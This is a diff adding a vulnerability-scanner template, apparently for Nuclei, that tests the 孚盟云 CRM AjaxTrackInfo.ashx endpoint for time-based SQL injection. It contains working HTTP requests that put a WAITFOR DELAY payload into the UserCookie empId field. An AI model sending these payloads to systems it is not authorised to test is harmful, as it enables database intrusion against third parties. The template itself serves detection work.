@@ -1,0 +1,40 @@
+id: fumengyunCRM-AjaxTrackInfo-sql
+
+info:
+  name: 孚盟云CRM AjaxTrackInfo.ashx 存在SQL注入漏洞
+  author: fumengyunCRM
+  severity: high
+  tags: fumengyunCRM
+
+http:
+  - raw:
+      - |
+        POST /m/Dingding/Ajax/AjaxTrackInfo.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Cookie: UserCookie={"empId":"'WAITFOR DELAY'0:0:2'--","corpId": "1"}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=SendMessage
+
+      - |
+        POST /m/Dingding/Ajax/AjaxTrackInfo.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Cookie: UserCookie={"empId":"'WAITFOR DELAY'0:0:4'--","corpId": "1"}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=SendMessage
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+          - 302
+      - type: dsl
+        dsl:
+          - 'duration_1>=2 && duration_1<4'  
+          - 'duration_2>=4 && duration_2<6'
+        condition: and
